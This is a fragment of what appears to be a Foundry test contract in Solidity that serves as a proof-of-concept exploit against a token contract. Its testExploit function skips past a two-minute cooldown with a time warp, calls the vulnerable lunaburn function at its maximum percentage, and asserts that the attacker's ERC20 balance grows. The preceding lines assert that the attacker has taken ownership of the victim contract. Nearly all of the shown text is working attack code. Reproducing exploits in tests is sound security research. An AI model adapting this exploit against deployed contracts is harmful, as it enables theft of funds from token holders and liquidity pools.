        assertEq(victim.owner(), attacker);
        assertGt(victim.balanceOf(pair), 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        // Advance time by more than 2 minutes to bypass the cooldown check.
        vm.warp(block.timestamp + 2 minutes + 1);

        // Call the vulnerable function with the maximum allowed percentage (50 / 1000 = 5%).
        victim.lunaburn(50);
        uint256 finalBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

